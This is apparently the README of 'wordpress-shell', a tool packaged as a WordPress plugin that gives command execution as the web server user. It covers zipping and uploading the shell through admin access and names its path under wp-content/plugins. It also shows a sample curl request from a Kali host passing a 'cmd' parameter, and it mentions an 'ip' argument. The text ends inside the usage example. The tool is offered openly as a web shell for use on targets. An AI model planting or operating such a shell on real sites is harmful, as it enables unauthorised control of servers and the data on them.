wordpress-shell
===============

Cheap &amp; Nasty Wordpress Command Execution Shell.

Execute Commands as the webserver you are serving wordpress with!
Uploaded shell will probably be at <host>/wp-content/plugins/shell/shell.php

Install
=======
To install the shell, we are assuming you have administrative access to the Wordpress install and can install plugins.
Either upload the zip file located in the `dist/` directory, or create your own archive with:

```bash
$ zip -r shell.zip shell.php
  adding: shell.php (deflated 39%)
  
$ ls -lah shell.zip
-rw-r--r--  1 bob  staff   492B Aug 29 14:17 shell.zip
```

Once uploaded, navigate to `/wp-content/plugins/shell/shell.php` and provide the `cmd` or `ip` as an argument.

Sample Usage
============

```bash
root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"uname -a"})')"
